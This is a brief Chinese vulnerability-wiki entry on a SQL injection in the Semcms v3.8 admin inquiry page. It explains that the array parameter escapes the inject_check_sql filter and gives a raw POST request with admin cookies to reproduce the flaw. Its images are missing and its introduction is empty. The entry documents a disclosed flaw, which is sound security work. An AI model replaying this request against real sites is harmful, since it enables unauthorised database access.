Semcms v3.8 sql注入漏洞
=======================

一、漏洞简介
------------

二、漏洞影响
------------

Semcms v3.8

三、复现过程
------------

> URL: <http://0-sec.org/123/sOWj5B_Admin/SEMCMS_Inquiry.php>
>
> ![](/Users/aresx/Documents/VulWiki/.resource/Semcmsv3.8sql注入漏洞/media/rId25.png){width="5.833333333333333in"
> height="2.9166666666666665in"}Debug：Defense module is
> class.phpmailer.php and function
> inject\_check\_sql![](/Users/aresx/Documents/VulWiki/.resource/Semcmsv3.8sql注入漏洞/media/rId26.png){width="5.833333333333333in"
> height="0.4946084864391951in"}But VID\[\] didn\'t handle it

-   POST

```{=html}
<!-- -->
```
    POST /123/sOWj5B_Admin/SEMCMS_Inquiry.php?Class=Deleted&CF=Inquriy&page= HTTP/1.1
    Host: 0-sec.org
    Content-Length: 24
    Cache-Control: max-age=0
    Origin: http://127.0.0.1
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://127.0.0.1/123/sOWj5B_Admin/SEMCMS_Inquiry.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: MEIQIA_EXTRA_TRACK_ID=1F7WZdk3rwHIzKqUfkrNaZ9t1EE; _ga=GA1.1.1842664860.1547715044; UM_distinctid=169c55686280-0636c606d502d3-36664c08-1fa400-169c556862b2e4; CNZZDATA1256162028=1606185978-1553793969-%7C1553793969; CNZZDATA1707573=cnzz_eid%3D987595238-1554794879-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1554913098; PHPSESSID=n75nrqp26757vguhhgd4mlptd4; __51cke__=; __tins__4329483=%7B%22sid%22%3A%201556088941568%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201556090843766%7D; __51laig__=3; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
    Connection: close

    languageID=&AID%5B%5D=3

image
